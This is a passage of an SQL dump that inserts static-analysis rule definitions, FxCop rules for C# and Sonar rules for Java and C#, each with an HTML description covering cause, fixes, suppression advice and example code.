<p><a href="http://msdn.microsoft.com/en-us/library/ms182365.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182365.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812440, 1510817812441, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (525, 'CA2229: Implement serialization constructors', 'ImplementSerializationConstructors', 'CA2229', 'fxcop', '<h2>Cause</h2>
<p>
            The type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or interface, and one of the following conditions is true:
            <ul>
              <li>
                The type does not have a constructor that takes a <code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object (the signature of the serialization constructor).
              </li>
              <li>
                The type is unsealed and the access modifier for its serialization constructor is not protected (family).
              </li>
              <li>
                The type is sealed and the access modifier for its serialization constructor is not private.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            This rule is relevant for types that support custom serialization. A type supports custom serialization if it implements the <code>ISerializable</code> interface. The serialization constructor is required to deserialize, or re-create objects that have been serialized using the <code>ISerializable.GetObjectData</code> method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement the serialization constructor. For a sealed class, make the constructor private; otherwise, make it protected.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a violation of the rule. The type will not be deserializable, and will not function in many scenarios.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:MarkISerializableTypesWithSerializable}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182343.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182343.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812442, 1510817812442, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1115, 'Constant names should comply with a naming convention', 'S00115', 'S115', 'squid', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public class MyClass {
  public static final int first = 1;
}

public enum MyEnum {
  first;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public static final int FIRST = 1;
}

public enum MyEnum {
  FIRST;
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813208, 1510817813209, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1116, '"toString()" and "clone()" methods should not return null', 'S2225', NULL, 'squid', '<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>
instead contravenes the method''s implicit contract.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return null; // Noncompliant
  } else {
    // ...
 {code}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return "";
  } else {
    // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817813210, 1510817813210, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1117, 'Classes and enums with private members should have a constructor', 'S1258', NULL, 'squid', '<p>Non-abstract <code>class</code>es and <code>enum</code>s with non-<code>static</code>, <code>private</code> members should explicitly initialize
those members, either in a constructor or with a default value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A { // Noncompliant
  private int field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private int field;

  A(int field) {
    this.field = field;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813211, 1510817813211, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (527, 'CA2144: Transparent code should not load assemblies from byte arrays', 'TransparentMethodsShouldNotLoadAssembliesFromByteArrays', 'CA2144', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent method loads an assembly from a byte array using one of the following methods:
            <ul>
              <li>


                    <code>Load</code>


              </li>
              <li>


                    <code>Load</code>


              </li>
              <li>


                    <code>Load</code>

              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            The security review for transparent code is not as thorough as the security review for critical code, because transparent code cannot perform security sensitive actions. Assemblies loaded from a byte array might not be noticed in transparent code, and that byte array might contain critical, or more importantly safe-critical code, that does need to be audited. Therefore, transparent code should not load assemblies from a byte array.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the method that is loading the assembly with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997568.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997568.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812444, 1510817812444, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (528, 'CA2200: Rethrow to preserve stack details', 'RethrowToPreserveStackDetails', 'CA2200', 'fxcop', '<h2>Cause</h2>
<p>
            An exception is re-thrown and the exception is explicitly specified in the <code>throw</code> statement.
</p>
<h2>Rule Description</h2>
<p>
            Once an exception is thrown, part of the information it carries is the stack trace. The stack trace is a list of the method call hierarchy that starts with the method that throws the exception and ends with the method that catches the exception. If an exception is re-thrown by specifying the exception in the <code>throw</code> statement, the stack trace is restarted at the current method and the list of method calls between the original method that threw the exception and the current method is lost. To keep the original stack trace information with the exception, use the <code>throw</code> statement without specifying the exception.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, re-throw the exception without specifying the exception explicitly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182363.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182363.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812445, 1510817812446, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1118, 'Branches should have sufficient coverage by unit tests', 'InsufficientBranchCoverage', NULL, 'common-cs', 'An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, 'number of uncovered conditions', NULL, 'bad-practice', false, 'HTML', 1510817813214, 1510817813215, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1119, 'Lines should have sufficient coverage by unit tests', 'InsufficientLineCoverage', NULL, 'common-cs', 'An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines under the coverage threshold', NULL, 'bad-practice', false, 'HTML', 1510817813218, 1510817813218, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1120, 'Source files should have a sufficient density of comment lines', 'InsufficientCommentDensity', NULL, 'common-cs', 'An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, 'number of lines required to meet minimum density', NULL, 'convention', false, 'HTML', 1510817813221, 1510817813221, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1121, 'Source files should not have any duplicated blocks', 'DuplicatedBlocks', NULL, 'common-cs', 'An issue is created on a file as soon as there is at least one block of duplicated code on this file', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '10min', NULL, '10min', 'number of duplicate blocks', NULL, 'pitfall', false, 'HTML', 1510817813223, 1510817813227, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1122, 'Skipped unit tests should be either removed or fixed', 'SkippedUnitTests', NULL, 'common-cs', 'Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of skipped tests', NULL, 'pitfall', false, 'HTML', 1510817813228, 1510817813229, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1123, 'Failed unit tests should be fixed', 'FailedUnitTests', NULL, 'common-cs', 'Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of failed tests', NULL, NULL, false, 'HTML', 1510817813230, 1510817813230, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (529, 'CA2119: Seal methods that satisfy private interfaces', 'SealMethodsThatSatisfyPrivateInterfaces', 'CA2119', 'fxcop', '<h2>Cause</h2>
<p>
            An inheritable public type provides an overridable method implementation of an <code>internal</code> (<code>Friend</code> in Visual Basic) interface.
</p>
<h2>Rule Description</h2>
<p>
            Interface methods have public accessibility, which cannot be changed by the implementing type. An internal interface creates a contract that is not intended to be implemented outside the assembly that defines the interface. A public type that implements a method of an internal interface using the <code>virtual</code> (<code>Overridable</code> in Visual Basic) modifier allows the method to be overridden by a derived type that is outside the assembly. If a second type in the defining assembly calls the method and expects an internal-only contract, behavior might be compromised when, instead, the overridden method in the outside assembly is executed. This creates a security vulnerability.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, prevent the method from being overridden outside the assembly by using one of the following:
            <ul>
              <li>
                Make the declaring type <code>sealed</code> (<code>NotInheritable</code> in Visual Basic).
              </li>
              <li>
                Change the accessibility of the declaring type to <code>internal</code> (<code>Friend</code> in Visual Basic).
              </li>
              <li>
                Remove all public constructors from the declaring type.
              </li>
              <li>
                Implement the method without using the <code>virtual</code> modifier.
              </li>
              <li>
                Implement the method explicitly.
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if, after careful review, no security issues exist that might be exploitable if the method is overridden outside the assembly.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182313.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182313.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812446, 1510817812447, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (530, 'CA2212: Do not mark serviced components with WebMethod', 'DoNotMarkServicedComponentsWithWebMethod', 'CA2212', 'fxcop', '<h2>Cause</h2>
<p>
            A method in a type that inherits from <code>System.EnterpriseServices.ServicedComponent</code> is marked with <code>System.Web.Services.WebMethodAttribute</code>.
</p>
<h2>Rule Description</h2>
<p>


                <code>WebMethodAttribute</code>
               applies to methods within an XML Web service that were created by using ASP.NET; it makes the method callable from remote Web clients. The method and class must be public and executing in an ASP.NET Web application. <code>ServicedComponent</code> types are hosted by COM+ applications and can use COM+ services. <code>WebMethodAttribute</code> is not applied to <code>ServicedComponent</code> types because they are not intended for the same scenarios. Specifically, adding the attribute to the <code>ServicedComponent</code> method does not make the method callable from remote Web clients. Because <code>WebMethodAttribute</code> and a <code>ServicedComponent</code> method have conflicting behaviors and requirements for context and transaction flow, the behavior of the method will be incorrect in some scenarios.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the attribute from the <code>ServicedComponent</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. There are no scenarios where combining these elements is correct.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182336.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182336.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812448, 1510817812448, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (531, 'CA1053: Static holder types should not have constructors', 'StaticHolderTypesShouldNotHaveConstructors', 'CA1053', 'fxcop', '<h2>Cause</h2>
<p>
            A public or nested public type declares only static members and has a public or protected default constructor.
</p>
<h2>Rule Description</h2>
<p>
            The constructor is unnecessary because calling static members does not require an instance of the type. Also, because the type does not have non-static members, creating an instance does not provide access to any of the type''s members.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the default constructor or make it private.





                    Note




                    Some compilers automatically create a public default constructor if the type does not define any constructors. If this is the case with your type, add a private default constructor to eliminate the violation.




</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. The presence of the constructor suggests that the type is not a static type.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182169.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182169.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812449, 1510817812449, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (532, 'CA1010: Collections should implement generic interface', 'CollectionsShouldImplementGenericInterface', 'CA1010', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type implements the <code>System.Collections.IEnumerable</code> interface but does not implement the <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code> interface, and the containing assembly targets .NET Framework 2.0. This rule ignores types that implement <code>System.Collections.IDictionary</code>.
</p>
<h2>Rule Description</h2>
<p>
            To broaden the usability of a collection, implement one of the generic collection interfaces. Then the collection can be used to populate generic collection types such as the following:
            <ul>
              <li>


                    <code>System.Collections.Generic.List&lt;T&gt;</code>


              </li>
              <li>


                    <code>System.Collections.Generic.Queue&lt;T&gt;</code>


              </li>
              <li>


                    <code>System.Collections.Generic.Stack&lt;T&gt;</code>


              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement one of the following generic collection interfaces:
            <ul>
              <li>


                    <code>System.Collections.Generic.IEnumerable&lt;T&gt;</code>


              </li>
              <li>


                    <code>System.Collections.Generic.ICollection&lt;T&gt;</code>


              </li>
              <li>


                    <code>System.Collections.Generic.IList&lt;T&gt;</code>


              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule; however, the collection will have a more limited use.
</p>
<h2>Example Violation</h2>

<h3>Description</h3>
<p>
                The following example shows a class (reference type) that derives from the non-generic CollectionBase class, which violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Collections;

namespace Samples
{
    public class Book
    {
        public Book()
        {
        }
    }

    public class BookCollection : CollectionBase
    {
        public BookCollection()
        {
        }

        public void Add(Book value)
        {
            InnerList.Add(value);
        }

        public void Remove(Book value)
        {
            InnerList.Remove(value);
        }

        public void Insert(int index, Book value)
        {
            InnerList.Insert(index, value);
        }

        public Book this[int index]
        {
            get { return (Book)InnerList[index]; }
            set { InnerList[index] = value; }
        }

        public bool Contains(Book value)
        {
            return InnerList.Contains(value);
        }

        public int IndexOf(Book value)
        {
            return InnerList.IndexOf(value);
        }

        public void CopyTo(Book[] array, int arrayIndex)
        {
            InnerList.CopyTo(array, arrayIndex);
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                To fix a violation of this violation, you should either implement the generic interfaces or change the base class to a type that already implements both the generic and non-generic interfaces, such as the Collection&lt;T&gt; class.
</p>
<h2>Fix by Base Class Change</h2>

<h3>Description</h3>
<p>
                The following example fixes the violation by changing the base class of the collection from the non-generic CollectionBase class to the generic Collection&lt;T&gt; (Collection(Of T) in Visual Basic) class.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Collections.ObjectModel;

namespace Samples
{
    public class Book
    {
        public Book()
        {
        }
    }

    public class BookCollection : Collection&lt;Book&gt;
    {
        public BookCollection()
        {
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                Changing the base class of an already released class is considered a breaking change to existing consumers.
</p>
<h2>Fix by Interface Implementation</h2>

<h3>Description</h3>
<p>
                The following example fixes the violation by implementing these generic interfaces: IEnumerable&lt;T&gt;, ICollection&lt;T&gt;, and IList&lt;T&gt; (IEnumerable(Of T), ICollection(Of T), and IList(Of T) in Visual Basic).
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Collections;
using System.Collections.Generic;

namespace Samples
{
    public class Book
    {
        public Book()
        {
        }
    }

    public class BookCollection : CollectionBase, IList&lt;Book&gt;
    {
        public BookCollection()
        {
        }

        int IList&lt;Book&gt;.IndexOf(Book item)
        {
            return this.List.IndexOf(item);
        }

        void IList&lt;Book&gt;.Insert(int location, Book item)
        {
        }

        Book IList&lt;Book&gt;.this[int index]
        {
            get { return (Book) this.List[index]; }
            set { }
        }

        void ICollection&lt;Book&gt;.Add(Book item)
        {
        }

        bool ICollection&lt;Book&gt;.Contains(Book item)
        {
            return true;
        }

        void ICollection&lt;Book&gt;.CopyTo(Book[] array, int arrayIndex)
        {
        }

        bool ICollection&lt;Book&gt;.IsReadOnly
        {
            get { return false; }
        }

        bool ICollection&lt;Book&gt;.Remove(Book item)
        {
            if (InnerList.Contains(item))
            {
                InnerList.Remove(item);
                return true;
            }
            return false;
        }

        IEnumerator&lt;Book&gt; IEnumerable&lt;Book&gt;.GetEnumerator()
        {
            return new BookCollectionEnumerator(InnerList.GetEnumerator());
        }

        private class BookCollectionEnumerator : IEnumerator&lt;Book&gt;
        {
            private IEnumerator _Enumerator;

            public BookCollectionEnumerator(IEnumerator enumerator)
            {
                _Enumerator = enumerator;
            }

            public Book Current
            {
                get { return (Book)_Enumerator.Current; }
            }

            object IEnumerator.Current
            {
                get { return _Enumerator.Current; }
            }

            public bool MoveNext()
            {
                return _Enumerator.MoveNext();
            }

            public void Reset()
            {
                _Enumerator.Reset();
            }

            public void Dispose()
            {
            }
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182132.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182132.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812450, 1510817812451, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (533, 'CA1504: Review misleading field names', 'ReviewMisleadingFieldNames', 'CA1504', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an instance field starts with "s_" or the name of a <code>static</code> (<code>Shared</code> in Visual Basic) field starts with "m_".
</p>
<h2>Rule Description</h2>
<p>
            Field names that start with "s_" are associated with static data by many users. Similarly, field names that start with "m_" are associated with instance (member) data. For more easily maintained code, names should follow generally used conventions.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, rename the field by using the appropriate prefix. Alternatively, make the field agree with the current suffix by adding or removing the <code>static</code> modifier.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb164506.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb164506.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812453, 1510817812455, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (534, 'CA1811: Avoid uncalled private code', 'AvoidUncalledPrivateCode', 'CA1811', 'fxcop', '<h2>Cause</h2>
<p>
            A private or internal (assembly-level) member does not have callers in the assembly, is not invoked by the common language runtime, and is not invoked by a delegate. The following members are not checked by this rule:
            <ul>
              <li>
                Explicit interface members.
              </li>
              <li>
                Static constructors.
              </li>
              <li>
                Serialization constructors.
              </li>
              <li>
                Methods marked with <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> or <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code>.
              </li>
              <li>
                Members that are overrides.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            This rule can report false positives if entry points occur that are not currently identified by the rule logic. Also, a compiler may emit noncallable code into an assembly.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the noncallable code or add code that calls it.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>




                {rule:fxcop:ReviewUnusedParameters}<br/>




                {rule:fxcop:RemoveUnusedLocals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182264.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182264.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812455, 1510817812456, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (535, 'CA2104: Do not declare read only mutable reference types', 'DoNotDeclareReadOnlyMutableReferenceTypes', 'CA2104', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type contains an externally visible read-only field that is a mutable reference type.
</p>
<h2>Rule Description</h2>
<p>
            A mutable type is a type whose instance data can be modified. The <code>System.Text.StringBuilder</code> class is an example of a mutable reference type. It contains members that can change the value of an instance of the class. An example of an immutable reference type is the <code>System.String</code> class. After it has been instantiated, its value can never change.
            The read-only modifier (readonly (C# Reference) in C#, ReadOnly (Visual Basic) in Visual Basic, and <code>const (C++)</code> in C++) on a reference type field (pointer in C++) prevents the field from being replaced by a different instance of the reference type. However, the modifier does not prevent the instance data of the field from being modified through the reference type.
            Read-only array fields are exempt from this rule but instead cause a violation of the {rule:fxcop:ArrayFieldsShouldNotBeReadOnly} rule.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the read-only modifier or, if a breaking change is acceptable, replace the field with an immutable type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the field type is immutable.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182302.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182302.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812456, 1510817812459, 1);
